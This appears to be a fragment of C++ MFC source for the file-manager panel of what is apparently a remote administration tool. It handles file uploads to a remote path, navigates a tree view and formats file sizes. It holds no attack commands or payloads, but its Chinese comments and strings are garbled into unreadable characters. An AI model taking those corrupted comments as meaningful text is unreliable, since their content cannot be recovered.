			((CFileManager*)m_pWndMsg)->m_tabCtrl.SetCurFocus(1);
			CString strCount;
			strCount.Format(_T("��ǰ��������: %d"), iCount);
			::SendMessage( ((CFileManager*)m_pWndMsg)->m_fileStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)strCount.GetBuffer(0));
		}
	}
}

//�ļ��ϴ�
void CFileView::OnFileUpload()
{
	CFileDialog cUpLoadDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, NULL, this);
	if (IDOK == cUpLoadDlg.DoModal())
	{
		CString strDesFilePath = _T("");  //�����ļ�·��
		CString strCurFilePath = _T("");  //�ϴ����⼦���ļ���·��
		strDesFilePath = cUpLoadDlg.GetPathName();  //C:\FILE\TEXT.DAT
		GetDlgItemText(IDC_EDIT_CURPATH, strCurFilePath);
		strCurFilePath += cUpLoadDlg.GetFileName();  //�⼦�ϴ��·���� D:\File\TEXT.DAT
		WIN32_FIND_DATAW FileData;
		HANDLE hFile = FindFirstFileW(strDesFilePath, &FileData);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			::MessageBox(this->m_hWnd, _T("�޷����͸��ļ�"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		}
		else
		{
			DWORDLONG dl = MAXDWORD;
			__int64 uSize = ((__int64)FileData.nFileSizeHigh * (dl + 1)) + (__int64)FileData.nFileSizeLow;
			CString strRealSize = GetRealSize(uSize);
			((CFileManager*)m_pWndMsg)->m_tabCtrl.SetCurFocus(1);
			((CFileManager*)m_pWndMsg)->GetFileTransPoint()->OnAddFileList(1, strDesFilePath, strCurFilePath, strRealSize, 0);
		}
	}
}

//�������ؼ��ľ��ֵ�õ���ǰ�ļ���·��
CString CFileView::GetCurFilePath(IN HTREEITEM hCurrentItem)
{
	CString strFullPath = _T("");  //���ص�·��
	CString strTempPath = _T("");

	/*****  �ص㲿��---- ���ݵ�ǰѡ�еĽڵ�õ���ǰĿ¼·��   **********/    
	while (hCurrentItem != m_Root_tree)
	{
		strTempPath = m_treeFile.GetItemText(hCurrentItem);
		if (strTempPath.Right(1) != _T("\\"))
		{
			strTempPath += _T("\\");
		}
		strFullPath = strTempPath + strFullPath;
		hCurrentItem = m_treeFile.GetParentItem(hCurrentItem);
	}
	return strFullPath;
}

//�����ļ���·���õ������ؼ��о��
HTREEITEM CFileView::GetCurhItemByPath(IN CString strFolderName)
{
	HTREEITEM hChild = m_treeFile.GetChildItem(m_hItem);  //�õ��ӽڵ�ľ��
	while (NULL != hChild)
	{
		if (m_treeFile.GetItemText(hChild) == strFolderName)
		{
			break;
		}
		else
		{
			hChild = m_treeFile.GetNextSiblingItem(hChild);  //���������ֵܽڵ�
		}
	}
    return hChild;
}

void CFileView::DelChildItem(IN HTREEITEM hItem)
{
	while (NULL != m_treeFile.GetChildItem(hItem))
	{
		m_treeFile.DeleteItem(m_treeFile.GetChildItem(hItem));  //����ɾ���ڵ��µ�������Ŀ¼
	}
}

static CString GetRealSize(__int64 nSize)
{
	CString strFileSize = _T("");
	double result;
	if ( nSize >= 1024 * 1024 * 1024)  //GB
	{
		result = nSize * 1.0 / (1024 * 1024 * 1024);
		strFileSize.Format(_T("%0.2f GB"), result);
	}
	else if (nSize >= 1024 * 1024)   //MB
	{
		result = nSize * 1.0 / (1024 * 1024);
		strFileSize.Format(_T("%0.2f MB"), result);
	}
	else if (nSize >= 1024)    //KB
	{
		result = nSize * 1.0 / 1024;
		strFileSize.Format(_T("%0.2f KB"), result);
	}
	else
	{
		strFileSize.Format(_T("%0.2llu Byte"), nSize);
	}
	return strFileSize;
}

void CFileView::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	DestroyWindow();
	delete this;
}

void CFileView::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	((CFileManager*)this->m_pWndMsg)->m_pFileView = NULL; 
	CDialog::PostNcDestroy();
}
